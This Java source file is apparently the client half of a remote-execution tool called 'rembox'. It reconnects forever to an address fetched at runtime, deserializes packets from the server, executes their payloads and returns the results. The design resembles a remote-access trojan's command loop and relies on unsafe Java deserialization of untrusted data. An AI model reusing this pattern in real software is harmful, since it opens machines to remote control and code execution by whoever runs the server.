package rembox.client;

import rembox.packets.ExecutablePacket;
import rembox.packets.Packet;

import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.Socket;

public class Client {

    private static String ip;
    private static int port;
    private static ObjectInputStream inputStream;
    private static ObjectOutputStream outputStream;
    private static boolean connected;
    private static boolean lastException = false;

    public Client() {

        //When any unhandled exception is thrown, just try again and hope it works this time
        while(true) {
            connected = false;
            try {
                //Create socket
                String[] ipParts = IPGrabber.getRawIP().split(":");
                Socket socket = new Socket(ipParts[0], Integer.parseInt(ipParts[1]));

                //Setup streams
                outputStream = new ObjectOutputStream(socket.getOutputStream());
                inputStream = new ObjectInputStream(socket.getInputStream());
                outputStream.flush();

                //Start loop
                connected = true;
                listen();
            } catch(Exception e) {
                //Any exception not caught in the listen loop or deeper will auto reset the connection
                e.printStackTrace();
                inputStream = null;
                outputStream = null;
                connected = false;
            }
        }
    }

    private void listen() {
        //This loop runs until the connection is broken
        while(connected) {
            try {
                //Grab the ExecutablePacket
                Packet packet = (Packet)inputStream.readObject();
                ExecutablePacket executablePacket = packet.getPacket();

                //Execute the packets payload and send it back, with results generated
                executablePacket.execute();
                outputStream.writeObject(packet);
                lastException = false;
            } catch(Exception e) {
                e.printStackTrace();
                if(lastException) {
                    connected = false;
                }
                lastException = true;
            }
        }
    }
}
